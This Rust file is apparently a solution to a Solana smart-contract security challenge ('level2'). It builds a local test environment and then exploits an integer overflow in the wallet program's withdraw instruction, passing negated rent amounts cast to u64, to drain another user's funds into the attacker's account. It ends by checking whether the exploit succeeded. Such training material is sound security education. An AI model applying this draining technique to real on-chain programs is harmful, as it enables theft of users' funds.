use std::{env, str::FromStr};

use owo_colors::OwoColorize;
use poc_framework::solana_sdk::signature::Keypair;
use poc_framework::{
    keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction,
};
use solana_program::native_token::lamports_to_sol;

use pocs::assert_tx_success;
use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};

use borsh::BorshSerialize;
use level2::{WalletInstruction, get_wallet_address};
use solana_program::instruction::{AccountMeta, Instruction};
use solana_program::rent::Rent;
use solana_program::sysvar;

struct Challenge {
    hacker: Keypair,
    wallet_program: Pubkey,
    wallet_address: Pubkey,
    wallet_authority: Pubkey,
}

// Do your hacks in this function here
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    // Create Hacker Wallet //
    assert_tx_success(env.execute_as_transaction(
        &[level2::initialize(
            challenge.wallet_program,
            challenge.hacker.pubkey(),
        )],
        &[&challenge.hacker],
    ));

    // Get the Hacker's Wallet //
    let hacker_wallet = get_wallet_address(challenge.hacker.pubkey(), challenge.wallet_program);

    // Get Rent Transfer //
    let to_transfer = Rent::default().minimum_balance(8);
    println!("To transfer: {}", to_transfer);

    // Calculate Overflow as a u64 //
    let overflow = (-(to_transfer as i64)) as u64;

    // Execute x iterations //
    let iters = 10;

    for i in 0..iters {
        let tx = env.execute_as_transaction(
            &[Instruction {
                program_id: challenge.wallet_program,
                accounts: vec![
                    AccountMeta::new(hacker_wallet, false),              // source wallet
                    AccountMeta::new(challenge.hacker.pubkey(), true),   // owner
                    AccountMeta::new(challenge.wallet_address, false),   // target wallet
                    AccountMeta::new_readonly(sysvar::rent::id(), false), // rent
                ],
                data: WalletInstruction::Withdraw { amount: overflow+i }.try_to_vec().unwrap(),
            }],
            &[&challenge.hacker],
        );
        tx.print_named(&format!("haxx {}", i));
    }

    // Transfer everything from the Account to the Hacker's Pubkey //
    let tx = env.execute_as_transaction(
        &[Instruction {
            program_id: challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(hacker_wallet, false),              // source wallet
                AccountMeta::new(challenge.hacker.pubkey(), true),   // owner
                AccountMeta::new(challenge.hacker.pubkey(), false),  // target wallet
                AccountMeta::new_readonly(sysvar::rent::id(), false), // rent
            ],
            data: WalletInstruction::Withdraw { amount: to_transfer*iters-1000 }.try_to_vec().unwrap(),
        }],
        &[&challenge.hacker],
    );
    tx.print_named("hacker withdraw");
}
/*
SETUP CODE BELOW
*/
pub fn main() {
    let (mut env, challenge, internal) = setup();
    let before_balance = env.get_account(challenge.hacker.pubkey()).unwrap().lamports;
    hack(&mut env, &challenge);
    verify(&mut env, challenge, before_balance, internal);
}

struct Internal {
    wallet_authority: Keypair,
    wallet_amount: u64,
}

fn verify(
    env: &mut LocalEnvironment,
    challenge: Challenge,
    before_balance: u64,
    internal: Internal,
) {
    let after = env.get_account(challenge.hacker.pubkey()).unwrap().lamports;

    let tx = env.execute_as_transaction(
        &[level2::withdraw(
            challenge.wallet_program,
            challenge.wallet_authority,
            challenge.wallet_address,
            internal.wallet_amount,
        )],
        &[&internal.wallet_authority],
    );

    tx.print_named("Verification: authority withdraw");

    if tx.transaction.meta.unwrap().err.is_none() {
        println!(
            "[*] {}",
            "Original wallet authority successfully withdrew all funds.".red()
        )
    } else {
        println!(
            "[!] {}",
            "Original wallet authority cannot withdraw his funds anymore.".green()
        )
    }

    if after > before_balance {
        println!("[*] {}", "Congratulations, the exploit succeeded!".green());
        println!(
            "[*] Hacker has {} SOL more! ({} vs {})",
            lamports_to_sol(after - before_balance).green(),
            before_balance,
            after
        );
    } else {
        println!("[*] {}", "Exploit not successful.".red());
        println!(
            "[*] Hacker has {} SOL less! ({} vs {})",
            lamports_to_sol(before_balance - after).red(),
            before_balance,
            after
        );
    }
}

fn setup() -> (LocalEnvironment, Challenge, Internal) {
    let mut dir = env::current_exe().unwrap();
    let path = {
        dir.pop();
        dir.pop();
        dir.push("deploy");
        dir.push("level2.so");
        dir.to_str()
    }
    .unwrap();

    let wallet_program = Pubkey::from_str("W4113t3333333333333333333333333333333333333").unwrap();
    let wallet_authority = keypair(0);
    let rich_boi = keypair(1);
    let hacker = keypair(42);

    let a_lot_of_money = sol_to_lamports(1_000_000.0);

    let mut env = LocalEnvironment::builder()
        .add_program(wallet_program, path)
        .add_account_with_lamports(
            wallet_authority.pubkey(),
            system_program::ID,
            sol_to_lamports(100.0),
        )
        .add_account_with_lamports(rich_boi.pubkey(), system_program::ID, a_lot_of_money * 2)
        .add_account_with_lamports(hacker.pubkey(), system_program::ID, sol_to_lamports(1.0))
        .build();

    let wallet_address = level2::get_wallet_address(wallet_authority.pubkey(), wallet_program);

    // Create Wallet
    assert_tx_success(env.execute_as_transaction(
        &[level2::initialize(
            wallet_program,
            wallet_authority.pubkey(),
        )],
        &[&wallet_authority],
    ));

    println!("[*] Wallet created!");

    // rich boi pays for bill
    assert_tx_success(env.execute_as_transaction(
        &[level2::deposit(
            wallet_program,
            wallet_authority.pubkey(),
            rich_boi.pubkey(),
            a_lot_of_money,
        )],
        &[&rich_boi],
    ));
    println!("[*] rich boi payed his bills");

    (
        env,
        Challenge {
            wallet_address,
            hacker,
            wallet_program,
            wallet_authority: wallet_authority.pubkey(),
        },
        Internal {
            wallet_authority,
            wallet_amount: a_lot_of_money,
        },
    )
}
